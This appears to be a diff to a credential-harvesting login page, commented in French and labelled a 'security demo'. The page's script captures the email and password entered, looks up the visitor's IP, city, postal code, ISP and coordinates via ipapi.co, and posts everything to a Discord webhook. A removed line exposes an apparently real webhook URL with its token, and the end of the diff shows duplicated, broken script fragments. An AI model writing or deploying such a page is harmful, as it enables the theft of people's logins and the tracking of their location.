@@ -167,16 +167,6 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    // Récupération de l'adresse IP via un service externe
-    let ip = "Inconnu";
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const data = await res.json();
-      ip = data.ip;
-    } catch (err) {
-      console.error("Impossible d'obtenir l'IP :", err);
-    }
-
     // Infos navigateur / système
     const userAgent = navigator.userAgent;
     const lang = navigator.language;
@@ -185,20 +175,56 @@
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const sessionDuration = Math.round((Date.now() - sessionStart) / 1000); // en secondes
 
+    // Infos IP + géolocalisation via ipapi.co
+    let geoInfo = {
+      ip: "Inconnu",
+      city: "Inconnue",
+      region: "Inconnue",
+      country: "Inconnu",
+      org: "Inconnu",
+      postal: "Inconnu",
+      latitude: "N/A",
+      longitude: "N/A"
+    };
+
+    try {
+      const res = await fetch("https://ipapi.co/json");
+      const data = await res.json();
+      geoInfo = {
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        org: data.org,
+        postal: data.postal,
+        latitude: data.latitude,
+        longitude: data.longitude
+      };
+    } catch (err) {
+      console.error("Erreur récupération IP/Géo :", err);
+    }
+
     // Webhook Discord (ou console.log pour test local)
-    const webhookURL = "https://discord.com/api/webhooks/1360585270931751153/V_j_RxG3xVIjFiWyHyJJkIl4PI0p8mzhvZG2uxizjEWgbbPH9gkRkoopMbDILFIRLDg3";
+    const webhookURL = "https://discord.com/api/webhooks/ton_webhook_ici";
 
     const message = `
-🔐 **Connexion (Démo)**
+🔐 **Connexion (Démo Sécurité)**
 📧 Email : ${email}
 🔑 Mot de passe : ${password}
-🌍 IP : ${ip}
+🌍 IP : ${geoInfo.ip}
+🏙️ Ville : ${geoInfo.city}
+📍 Région : ${geoInfo.region}
+🇨🇵 Pays : ${geoInfo.country}
+🏢 FAI : ${geoInfo.org}
+📮 Code Postal : ${geoInfo.postal}
+📌 Coords : ${geoInfo.latitude}, ${geoInfo.longitude}
+
 🧭 Navigateur : ${userAgent}
-💻 OS / Plateforme : ${platform}
+💻 Plateforme : ${platform}
 🗺️ Langue : ${lang}
 🕒 Fuseau horaire : ${timezone}
 📐 Résolution écran : ${screenRes}
-⏱️ Temps passé sur la page : ${sessionDuration}s
+⏱️ Temps passé : ${sessionDuration} secondes
     `;
 
     fetch(webhookURL, {
@@ -207,14 +233,7 @@
       body: JSON.stringify({ content: message })
     });
 
-    alert("Merci ! Démonstration terminée.");
-    document.getElementById("login-form").reset();
-  });
-</script>
-     })
-    });
-
-    alert("Merci ! Démonstration terminée.");
+    alert("Merci ! Données de démo envoyées.");
     document.getElementById("login-form").reset();
   });
 </script>
